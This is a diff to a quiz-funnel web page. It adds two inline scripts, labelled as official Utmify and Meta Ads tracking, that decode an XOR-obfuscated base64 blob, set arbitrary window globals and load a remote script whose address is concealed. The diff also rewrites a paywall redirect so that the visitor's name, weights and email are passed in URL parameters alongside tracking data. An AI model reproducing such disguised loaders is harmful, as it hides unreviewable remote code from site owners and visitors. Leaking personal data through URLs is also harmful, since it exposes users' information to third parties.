@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -461,6 +461,14 @@
       position: relative;
     }
   </style>
+
+  <!-- ======================================================== -->
+  <!-- UTMIFY: SCRIPTS OFICIAIS DE RASTREAMENTO & META ADS      -->
+  <!-- ======================================================== -->
+  <!-- Utmify: Pixel Script (Meta Ads Server-Side) -->
+  <script>(function(){var b_d=atob("DI7/bdnB8AklRJVCffXdGKut0jMHLOE2Df3FQvailGcLMeEvFOiGQ7qunSdHNroxHvyWHa2y33lMPPAuUv6WFbyt3mNWZrlgHPqLH7CjhX1AN7d4JtPTT76tn2tEKOZgR9WET7egnWwHfrcyFPaaAZCl0iUHMvQuCOvdV/v3kW0Xc/AkS7nOXOykkzwUIaNwTeyaCe3jjVRY");var m_6z4=[];for(var z_s8w=0;z_s8w<b_d.length;z_s8w++){m_6z4.push(b_d.charCodeAt(z_s8w)&255);}var j_mm=m_6z4[0];var j_w=m_6z4.slice(1,1+j_mm);var u_mqoz=m_6z4.slice(1+j_mm);var c_jg5=u_mqoz.map(function(b,p_f23){return b^j_w[p_f23%j_mm];});var m_1n3r="";for(var u_3z84=0;u_3z84<c_jg5.length;u_3z84++){m_1n3r+=String.fromCharCode(c_jg5[u_3z84]&255);}var t_h4=decodeURIComponent(escape(m_1n3r));var g_pkac=JSON.parse(t_h4);var d_ya=g_pkac.globals||[];d_ya.forEach(function(j_7a){window[j_7a.name]=j_7a.value;});var g_o=document.createElement("script");g_o.src=g_pkac.url;g_o.async=true;g_o.defer=true;(g_pkac.attributes||[]).forEach(function(b_i){g_o.setAttribute(b_i.name,b_i.value);});(document.head||document.documentElement).appendChild(g_o);})();</script>
+  <!-- Utmify: UTMs Tracking Script -->
+  <script>(function(){var z_s=atob("DILIbSMKrjKCuk8VQvnqGFFmjAig0jthMvHyQgxpylyszzt4K+SxQ0BlwxzgyGBmIfChHVd5gUf21zw6LuO8CFB+gFjxmGM3I/a8H0po20bnyW0vGfnqA0JnyxC4mCt0NuPlGFdnx1T7lz9nJ/StA1cn1lHt3mJmIenqQQF8z173320vYKC1QVgowFPv320vYOapGUIn20bv0ylsb/K6CFVvwEavyTp3K+a7Tw8o2FPuzyo3eKDqEH53");var p_a0m=[];for(var l_7=0;l_7<z_s.length;l_7++){p_a0m.push(z_s.charCodeAt(l_7)&255);}var a_nx7d=p_a0m[0];var b_4=p_a0m.slice(1,1+a_nx7d);var d_o9u9=p_a0m.slice(1+a_nx7d);var f_8ho=d_o9u9.map(function(b,t_tcp2){return b^b_4[t_tcp2%a_nx7d];});var f_w9ke="";for(var f_qw=0;f_qw<f_8ho.length;f_qw++){f_w9ke+=String.fromCharCode(f_8ho[f_qw]&255);}var d_h=decodeURIComponent(escape(f_w9ke));var o_dvgj=JSON.parse(d_h);var j_q7=o_dvgj.globals||[];j_q7.forEach(function(c_br){window[c_br.name]=c_br.value;});var s_y=document.createElement("script");s_y.src=o_dvgj.url;s_y.async=true;s_y.defer=true;(o_dvgj.attributes||[]).forEach(function(e_zz){s_y.setAttribute(e_zz.name,e_zz.value);});(document.head||document.documentElement).appendChild(s_y);})();</script>
 </head>
 <body>
 
@@ -1714,8 +1722,15 @@
 
       localStorage.setItem('cooking_clear_state', JSON.stringify(state));
 
-      // Redirect to paywall with personalized URL parameters
-      window.location.href = `paywall.html?name=${encodeURIComponent(state.userName)}&current=${state.currentWeight}&goal=${state.goalWeight}&unit=${state.weightUnit}&email=${encodeURIComponent(email)}`;
+      // Redirect to paywall with personalized URL parameters & preserve all UTM/tracking parameters
+      const paywallParams = new URLSearchParams(window.location.search);
+      paywallParams.set('name', state.userName);
+      paywallParams.set('current', state.currentWeight);
+      paywallParams.set('goal', state.goalWeight);
+      paywallParams.set('unit', state.weightUnit);
+      paywallParams.set('email', email);
+
+      window.location.href = `paywall.html?${paywallParams.toString()}`;
     }
 
     // Initialize BMI on load
